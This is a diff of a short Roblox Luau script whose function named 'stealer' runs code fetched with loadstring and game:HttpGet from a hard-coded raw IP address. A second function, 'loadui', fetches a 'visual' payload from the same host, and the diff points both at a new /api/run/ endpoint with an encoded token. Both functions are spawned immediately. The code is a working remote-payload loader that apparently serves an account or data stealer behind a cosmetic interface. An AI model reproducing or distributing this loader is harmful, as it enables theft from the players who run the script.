@@ -1,11 +1,10 @@
 local function stealer()
  ID="acb9fdd9-23aa-41d7-83f6-dcc80af027a6";   
- loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+ loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImVjNWU1OGI0LWQxZTUtNGI5My1iZWQyLTU2MDRlOTUzODQyMiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
 end
 
 local function loadui()
-  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
-end
-
+  loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImVjNWU1OGI0LWQxZTUtNGI5My1iZWQyLTU2MDRlOTUzODQyMiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+ end
 task.spawn(stealer)
 task.spawn(loadui)
